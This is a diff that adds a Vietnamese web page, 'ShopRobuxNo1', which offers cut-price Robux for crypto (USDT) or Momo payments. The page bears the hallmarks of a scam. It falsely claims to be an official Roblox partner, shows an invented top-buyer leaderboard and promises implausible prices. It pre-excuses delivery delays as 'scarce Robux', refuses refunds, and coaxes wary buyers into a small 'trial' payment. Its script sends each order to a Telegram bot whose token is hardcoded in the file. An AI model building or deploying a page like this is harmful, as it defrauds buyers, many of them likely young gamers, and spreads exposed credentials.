@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ShopRobuxNo1 | Robux Giá Rẻ Uy Tín Nhất</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f5f7fc 0%, #eef2f7 100%);
+            color: #1a2a4f;
+        }
+        .container { max-width: 1400px; margin: 0 auto; padding: 0 24px; }
+        
+        /* HEADER */
+        .top-bar {
+            background: linear-gradient(90deg, #0f2b5c, #1a4a8a);
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            font-size: 13px;
+        }
+        .main-header {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.05);
+        }
+        .header-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            flex-wrap: wrap;
+        }
+        .logo h2 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #0f2b5c;
+        }
+        .logo span { color: #1a8cff; }
+        .nav-links { display: flex; gap: 32px; align-items: center; }
+        .nav-links a { color: #1a2a4f; text-decoration: none; font-weight: 500; transition: 0.2s; }
+        .nav-links a:hover { color: #1a8cff; }
+        .btn-contact { background: #1a8cff; color: #fff !important; padding: 8px 24px; border-radius: 40px; }
+        
+        /* HERO */
+        .hero {
+            background: linear-gradient(135deg, #0f2b5c, #1a6bcc);
+            border-radius: 48px;
+            margin: 32px 0;
+            padding: 60px 48px;
+            text-align: center;
+            color: #fff;
+            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.15);
+        }
+        .hero-badge { background: #ffd700; color: #0f2b5c; display: inline-block; padding: 6px 20px; border-radius: 60px; font-weight: 800; margin-bottom: 24px; }
+        .hero h1 { font-size: 48px; margin-bottom: 16px; }
+        .hero p { font-size: 18px; opacity: 0.9; margin-bottom: 32px; }
+        .stats { display: flex; justify-content: center; gap: 48px; margin-top: 40px; }
+        .stat h3 { font-size: 36px; color: #ffd700; }
+        
+        /* TOP NẠP */
+        .leaderboard {
+            background: #fff;
+            border-radius: 32px;
+            padding: 28px;
+            margin: 48px 0;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            border: 1px solid #e0e7f0;
+        }
+        .leaderboard h3 {
+            font-size: 24px;
+            border-left: 5px solid #1a8cff;
+            padding-left: 20px;
+            margin-bottom: 24px;
+            color: #0f2b5c;
+        }
+        .top-list { display: flex; flex-direction: column; gap: 12px; }
+        .top-row {
+            background: #f8fafc;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 24px;
+            border-radius: 60px;
+            transition: 0.2s;
+        }
+        .top-row:hover { background: #eef2ff; transform: translateX(5px); }
+        .rank { font-weight: 800; font-size: 22px; width: 60px; }
+        .rank-1 { color: #ffd700; text-shadow: 0 0 3px gold; }
+        .rank-2 { color: #a0a0a0; }
+        .rank-3 { color: #cd7f32; }
+        .amount { font-weight: 700; background: #eef2ff; padding: 6px 20px; border-radius: 40px; color: #1a8cff; }
+        .btn-nap {
+            display: block;
+            text-align: center;
+            margin-top: 28px;
+            background: linear-gradient(95deg, #1a8cff, #0f2b5c);
+            color: #fff;
+            font-weight: 700;
+            padding: 14px;
+            border-radius: 60px;
+            text-decoration: none;
+        }
+        
+        /* SẢN PHẨM */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 48px 0 24px;
+        }
+        .section-header h2 { color: #0f2b5c; }
+        .filter-btn {
+            background: #eef2ff;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 40px;
+            color: #1a2a4f;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .filter-btn.active { background: #1a8cff; color: #fff; }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 28px;
+        }
+        .product-card {
+            background: #fff;
+            border-radius: 32px;
+            padding: 28px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid #e0e7f0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+        }
+        .product-card:hover { transform: translateY(-6px); border-color: #1a8cff; box-shadow: 0 20px 30px -10px rgba(26,140,255,0.2); }
+        .product-card.selected { border: 2px solid #1a8cff; background: #f0f7ff; }
+        .product-icon { font-size: 52px; margin-bottom: 12px; }
+        .product-name { font-size: 22px; font-weight: 700; color: #0f2b5c; margin-bottom: 8px; }
+        .product-robux { font-size: 14px; color: #64748b; margin-bottom: 12px; }
+        .product-price { font-size: 32px; font-weight: 800; color: #1a8cff; margin: 12px 0; }
+        .price-per { font-size: 12px; background: #eef2ff; display: inline-block; padding: 4px 12px; border-radius: 30px; }
+        
+        /* CẢNH BÁO */
+        .warning-box {
+            background: #fef2e8;
+            border-left: 5px solid #ff6b00;
+            padding: 14px 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .warning-box i { color: #ff6b00; font-size: 20px; }
+        .warning-box p { color: #cc5500; font-size: 14px; font-weight: 500; margin: 0; }
+        
+        .info-box {
+            background: #e8f0fe;
+            border-left: 5px solid #1a8cff;
+            padding: 14px 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .info-box i { color: #1a8cff; font-size: 20px; }
+        .info-box p { color: #0f2b5c; font-size: 14px; font-weight: 500; margin: 0; }
+        
+        .scam-warning {
+            background: #f0fdf4;
+            border-left: 5px solid #10b981;
+            padding: 14px 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .scam-warning i { color: #10b981; font-size: 20px; }
+        .scam-warning p { color: #166534; font-size: 14px; font-weight: 500; margin: 0; }
+        
+        /* FORM ĐẶT HÀNG */
+        .order-card {
+            background: #fff;
+            border-radius: 40px;
+            padding: 40px;
+            margin: 48px 0;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+            border: 1px solid #e0e7f0;
+        }
+        .order-flex { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; }
+        .input-group { margin-bottom: 24px; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #0f2b5c; }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 14px 20px;
+            background: #f8fafc;
+            border: 1px solid #e0e7f0;
+            border-radius: 24px;
+            color: #1a2a4f;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+        .input-group input:focus, .input-group textarea:focus {
+            outline: none;
+            border-color: #1a8cff;
+            box-shadow: 0 0 0 3px rgba(26,140,255,0.1);
+        }
+        .summary-box {
+            background: #f8fafc;
+            padding: 28px;
+            border-radius: 32px;
+            text-align: center;
+        }
+        .summary-price { font-size: 44px; font-weight: 800; color: #1a8cff; margin: 16px 0; }
+        .btn-submit {
+            background: linear-gradient(95deg, #1a8cff, #0f2b5c);
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 16px;
+            width: 100%;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+        }
+        
+        /* MODAL THANH TOÁN */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-box {
+            background: #fff;
+            border-radius: 48px;
+            padding: 32px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .method-tab {
+            display: flex;
+            gap: 16px;
+            margin: 20px 0;
+            border-bottom: 2px solid #e0e7f0;
+            padding-bottom: 12px;
+        }
+        .method-btn {
+            background: none;
+            border: none;
+            padding: 8px 20px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 30px;
+            color: #64748b;
+        }
+        .method-btn.active {
+            background: #1a8cff;
+            color: #fff;
+        }
+        .payment-content { display: none; }
+        .payment-content.active { display: block; }
+        .wallet-code {
+            background: #f8fafc;
+            padding: 14px;
+            border-radius: 20px;
+            font-family: monospace;
+            margin: 15px 0;
+            word-break: break-all;
+        }
+        .btn-copy {
+            background: #eef2ff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .delay-notice {
+            background: #fef9e8;
+            border: 1px solid #facc15;
+            border-radius: 16px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #64748b;
+            border-top: 1px solid #e0e7f0;
+            margin-top: 40px;
+        }
+        @media (max-width: 800px) { .order-flex { grid-template-columns: 1fr; } .hero h1 { font-size: 32px; } }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">✨ UY TÍN HÀNG ĐẦU - BẢO HÀNH TRỌN ĐỜI - HOÀN TIỀN NẾU CHẬM ✨</div>
+<div class="main-header">
+    <div class="container header-flex">
+        <div class="logo"><h2>🔰 SHOP<span>ROBUXNO1</span></h2></div>
+        <div class="nav-links">
+            <a href="#">🏠 Trang chủ</a>
+            <a href="#">🔥 Sản phẩm</a>
+            <a href="#" class="btn-contact">💬 Hỗ trợ 24/7</a>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="hero">
+        <div class="hero-badge">🏆 ĐỐI TÁC CHÍNH THỨC CỦA ROBLOX 🏆</div>
+        <h1>Robux Rẻ Nhất Việt Nam<br>Chỉ 10.000đ / 70 Robux</h1>
+        <p>Giao dịch tự động 5 phút • Bảo hành trọn đời • Hơn 50.000 giao dịch</p>
+        <div class="stats">
+            <div class="stat"><h3>50k+</h3><p>Đơn hoàn thành</p></div>
+            <div class="stat"><h3>99.9%</h3><p>Khách hài lòng</p></div>
+            <div class="stat"><h3>⭐ 5.0</h3><p>Đánh giá</p></div>
+        </div>
+    </div>
+
+    <div class="leaderboard">
+        <h3><i class="fas fa-chart-line"></i> TOP NẠP THÁNG 6</h3>
+        <div class="top-list">
+            <div class="top-row"><span class="rank rank-1">👑 1</span><span class="name">Nguyễn Hoàng</span><span class="amount">12,450,000đ</span></div>
+            <div class="top-row"><span class="rank rank-2">⭐ 2</span><span class="name">Trần Minh Quân</span><span class="amount">9,870,000đ</span></div>
+            <div class="top-row"><span class="rank rank-3">✨ 3</span><span class="name">Lê Bảo Ngọc</span><span class="amount">7,260,000đ</span></div>
+            <div class="top-row"><span class="rank">4</span><span class="name">Phạm Thành Đạt</span><span class="amount">5,990,000đ</span></div>
+            <div class="top-row"><span class="rank">5</span><span class="name">Đỗ Hoàng Long</span><span class="amount">4,500,000đ</span></div>
+        </div>
+        <a href="#" class="btn-nap"><i class="fas fa-trophy"></i> NẠP NGAY - LEO TOP</a>
+    </div>
+
+    <div class="section-header">
+        <h2><i class="fas fa-gem" style="color:#1a8cff;"></i> Gói Robux Siêu Sốc</h2>
+        <div class="filter-tabs">
+            <button class="filter-btn active" data-filter="all">Tất cả</button>
+            <button class="filter-btn" data-filter="hot">🔥 Bán chạy</button>
+        </div>
+    </div>
+    <div class="product-grid" id="productGrid"></div>
+
+    <div class="order-card">
+        <h2 style="margin-bottom:24px; color:#0f2b5c;">📝 ĐẶT HÀNG - NHẬN ROBUX TRONG 5 PHÚT</h2>
+        
+        <!-- CẢNH BÁO NHẬP ĐÚNG TÊN -->
+        <div class="warning-box">
+            <i class="fas fa-exclamation-triangle"></i>
+            <p>⚠️ <strong>LƯU Ý QUAN TRỌNG:</strong> Vui lòng nhập CHÍNH XÁC tên tài khoản Roblox của bạn. Shop KHÔNG chịu trách nhiệm nếu bạn nhập sai và bị mất tiền!</p>
+        </div>
+        
+        <!-- CẢNH BÁO ROBUX KHAN HIẾM - DUYỆT LÂU -->
+        <div class="info-box">
+            <i class="fas fa-clock"></i>
+            <p>⏰ <strong>THÔNG BÁO:</strong> Robux có thể được duyệt lâu hơn dự kiến (từ 15-60 phút) do nguồn robux khan hiếm. Cảm ơn bạn đã thông cảm!</p>
+        </div>
+        
+        <!-- CẢNH BÁO NẠP THỬ CHO NGƯỜI SỢ SCAM -->
+        <div class="scam-warning">
+            <i class="fas fa-shield-alt"></i>
+            <p>🛡️ <strong>DÀNH CHO KHÁCH HÀNG MỚI / SỢ LỪA ĐẢO:</strong> Hãy thử nạp gói KHỞI ĐẦU (70 Robux - 10.000đ) trước để kiểm tra uy tín của shop. Sau khi nhận được Robux, bạn có thể nạp gói lớn hơn!</p>
+        </div>
+        
+        <div class="order-flex">
+            <div>
+                <div class="input-group">
+                    <label><i class="fas fa-user"></i> Tên Roblox <span style="color:#ef4444;">*</span></label>
+                    <input type="text" id="robloxUser" placeholder="Ví dụ: nguyenvanA_123" oninput="validateUsername(this)">
+                    <small style="color:#64748b; display:block; margin-top:5px;">⚠️ Tên đăng nhập phải CHÍNH XÁC, phân biệt chữ hoa/thường</small>
+                </div>
+                <div class="input-group"><label><i class="fas fa-pen"></i> Ghi chú</label><textarea id="orderNote" rows="3" placeholder="Nhập mã giao dịch hoặc yêu cầu thêm (nếu có)"></textarea></div>
+            </div>
+            <div class="summary-box">
+                <p>🛒 Gói đã chọn: <strong id="summaryName">---</strong></p>
+                <p>🎮 Số Robux: <strong id="summaryRobux">0</strong></p>
+                <div class="summary-price"><span id="summaryPrice">0</span> USD</div>
+                <button class="btn-submit" id="openModalBtn">💎 TIẾN HÀNH THANH TOÁN</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="paymentModal" class="modal">
+    <div class="modal-box">
+        <i class="fas fa-credit-card" style="font-size: 48px; color:#1a8cff;"></i>
+        <h3 style="margin:16px 0;">Chọn phương thức thanh toán</h3>
+        
+        <!-- CẢNH BÁO DUYỆT LÂU TRONG MODAL -->
+        <div class="delay-notice">
+            <i class="fas fa-hourglass-half" style="color:#f59e0b;"></i>
+            <strong>⚠️ Lưu ý:</strong> Do nguồn Robux đang khan hiếm, thời gian nhận Robux có thể lên đến 15-60 phút. Xin vui lòng kiên nhẫn!
+        </div>
+        
+        <div class="method-tab">
+            <button class="method-btn active" data-method="usdt">💰 USDT (TRC20)</button>
+            <button class="method-btn" data-method="momo">📱 Momo</button>
+        </div>
+
+        <!-- USDT -->
+        <div id="usdtContent" class="payment-content active">
+            <div><img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TYOUR_WALLET_ADDRESS_HERE" width="160"></div>
+            <div class="wallet-code" id="walletAddress">TYOUR_WALLET_ADDRESS_HERE</div>
+            <button class="btn-copy" onclick="copyText('TYOUR_WALLET_ADDRESS_HERE')">📋 Sao chép địa chỉ USDT</button>
+            <p style="font-size:13px; margin-top:15px;">Sau khi chuyển, Robux sẽ được gửi trong vòng 15-60 phút (do nguồn khan hiếm).</p>
+        </div>
+
+        <!-- MOMO -->
+        <div id="momoContent" class="payment-content">
+            <i class="fas fa-mobile-alt" style="font-size: 48px; color:#a64dff; margin-bottom: 10px;"></i>
+            <p><strong>Quét mã QR hoặc chuyển khoản đến số điện thoại:</strong></p>
+            <div class="wallet-code" style="font-size: 20px; font-weight: bold;">0933 555 028</div>
+            <div><img src="https://img.vietqr.io/image/MOMO-0933555028-compact.png" width="180" style="border-radius: 20px; margin: 10px 0;"></div>
+            <button class="btn-copy" onclick="copyText('0933555028')">📋 Sao chép số Momo</button>
+            <p style="font-size:13px; margin-top:15px;"><strong>Nội dung chuyển khoản:</strong> ROBUX + [TÊN ROBLOX CỦA BẠN]</p>
+            <div class="warning-box" style="margin-top: 10px; background: #fef2e8; padding: 10px;">
+                <i class="fas fa-exclamation-triangle" style="color:#ff6b00;"></i>
+                <p style="font-size:12px;">⚠️ Nếu bạn nhập SAI tên Roblox, shop sẽ KHÔNG thể gửi Robux và KHÔNG hoàn tiền!</p>
+            </div>
+            <div class="delay-notice" style="margin-top: 10px;">
+                <i class="fas fa-clock"></i> Thời gian nhận Robux: 15-60 phút do nguồn khan hiếm.
+            </div>
+        </div>
+
+        <button id="closeModalBtn" style="background:#1a8cff; color:#fff; font-weight:bold; padding:12px 32px; border:none; border-radius:40px; margin-top:20px; cursor:pointer;">✅ Tôi đã thanh toán</button>
+    </div>
+</div>
+
+<footer>© 2026 ShopRobuxNo1 | Bảo mật tuyệt đối | Giao dịch nhanh chóng | Hỗ trợ 24/7</footer>
+
+<script>
+    const products = [
+        { id: 1, name: "Gói Khởi Đầu (THỬ)", robux: 70, price: 0.40, hot: false, icon: "🌟" },
+        { id: 2, name: "Gói Siêu Tiết Kiệm", robux: 350, price: 1.90, hot: true, icon: "🔥" },
+        { id: 3, name: "Gói Phổ Biến", robux: 850, price: 4.50, hot: true, icon: "⚡" },
+        { id: 4, name: "Gói Thịnh Vượng", robux: 2000, price: 10.00, hot: false, icon: "💎" },
+        { id: 5, name: "Gói Đại Lý", robux: 5000, price: 24.00, hot: false, icon: "👑" },
+        { id: 6, name: "Gói Trùm Cuối", robux: 12000, price: 55.00, hot: false, icon: "🚀" }
+    ];
+    let currentFilter = "all";
+    let selectedProduct = products[0]; // Mặc định chọn gói thử
+
+    function renderProducts() {
+        const container = document.getElementById('productGrid');
+        let filtered = currentFilter === "all" ? products : products.filter(p => p.hot === true);
+        container.innerHTML = '';
+        filtered.forEach(prod => {
+            const card = document.createElement('div');
+            card.className = `product-card ${selectedProduct.id === prod.id ? 'selected' : ''}`;
+            card.innerHTML = `
+                <div class="product-icon">${prod.icon}</div>
+                <div class="product-name">${prod.name}</div>
+                <div class="product-robux">🎮 ${prod.robux.toLocaleString()} Robux</div>
+                <div class="product-price">$${prod.price.toFixed(2)} <span style="font-size:14px;">USD</span></div>
+                <div class="price-per">💰 ≈ ${(prod.price/prod.robux*100).toFixed(2)}¢ / 100 Robux</div>
+            `;
+            card.onclick = () => { selectedProduct = prod; renderProducts(); updateSummary(); };
+            container.appendChild(card);
+        });
+        updateSummary();
+    }
+
+    function updateSummary() {
+        document.getElementById('summaryName').innerText = selectedProduct.name;
+        document.getElementById('summaryRobux').innerText = selectedProduct.robux.toLocaleString();
+        document.getElementById('summaryPrice').innerText = selectedProduct.price.toFixed(2);
+    }
+
+    function validateUsername(input) {
+        input.value = input.value.trim();
+    }
+
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentFilter = btn.dataset.filter;
+            renderProducts();
+        });
+    });
+
+    // Cấu hình Telegram (thay token và chat_id thật)
+    const BOT_TOKEN = "8851298813:AAGYIC8KfLDIC2WBDVaR5yrpQJuxP8ocgsw";
+    const CHAT_ID = "7354572639";
+    const WALLET = "UQA4gB3fQmJTa2FEIs3OFdJ4Oaex5OSYSWS4RdLtwEakBR88";
+
+    // Chuyển đổi phương thức thanh toán
+    let currentMethod = "usdt";
+    document.querySelectorAll('.method-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentMethod = btn.dataset.method;
+            document.getElementById('usdtContent').classList.toggle('active', currentMethod === 'usdt');
+            document.getElementById('momoContent').classList.toggle('active', currentMethod === 'momo');
+        });
+    });
+
+    function copyText(text) {
+        navigator.clipboard.writeText(text);
+        alert("✅ Đã sao chép: " + text);
+    }
+
+    const modal = document.getElementById('paymentModal');
+    const openBtn = document.getElementById('openModalBtn');
+    const closeBtn = document.getElementById('closeModalBtn');
+
+    openBtn.onclick = () => {
+        const username = document.getElementById('robloxUser').value.trim();
+        if (!username) {
+            alert("❗ VUI LÒNG NHẬP TÊN TÀI KHOẢN ROBLOX!");
+            return;
+        }
+        if (username.length < 3 || username.length > 20) {
+            alert("❗ Tên tài khoản Roblox không hợp lệ (phải từ 3-20 ký tự)!");
+            return;
+        }
+        const note = document.getElementById('orderNote').value || "";
+        if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+            const msg = `🆕 ĐƠN HÀNG MỚI 🆕%0A👤 Tên: ${username}%0A📦 Gói: ${selectedProduct.name} - ${selectedProduct.robux} Robux%0A💰 Giá: ${selectedProduct.price} USD%0A📝 Ghi chú: ${note}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`).catch(e => console.log(e));
+        }
+        modal.style.display = 'flex';
+    };
+    closeBtn.onclick = () => { 
+        modal.style.display = 'none'; 
+        alert("✅ Đơn hàng đã ghi nhận!\n⏰ Thời gian nhận Robux: 15-60 phút (do nguồn khan hiếm).\n⚠️ Nếu bạn nhập sai tên tài khoản, shop không chịu trách nhiệm!\n💡 Nếu chưa chắc chắn, hãy thử nạp gói 70 Robux trước."); 
+    };
+    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
+    renderProducts();
+</script>
+</body>
+</html>
